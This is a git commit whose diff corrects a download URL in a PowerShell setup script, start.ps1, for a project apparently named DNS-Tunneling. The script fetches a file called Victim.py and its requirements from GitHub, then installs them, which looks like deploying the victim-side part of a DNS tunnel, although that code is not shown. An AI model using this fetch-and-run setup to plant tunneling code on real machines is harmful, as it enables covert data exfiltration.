917a11b7b68a89feea740141aa94b6de30a2cfb0
ShacharMarkovich <234shachar@gmail.com>
2021-11-30 15:18:43 +0200

    fix scripts

--- start.ps1
+++ start.ps1
@@ -5,11 +5,10 @@ cd C:\scripts
 $WebClient = New-Object System.Net.WebClient
 $WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/Victim.py","C:\scripts\v.py")
 $WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/ip.txt","C:\scripts\ip.txt")
-$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/ip.txt","C:\scripts\requirements.txt")
+$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/requirements.txt","C:\scripts\requirements.txt")
 
 python -m venv env
 .\env\Scripts\Activate.ps1
-
 
 pip install -r requirements.txt
 
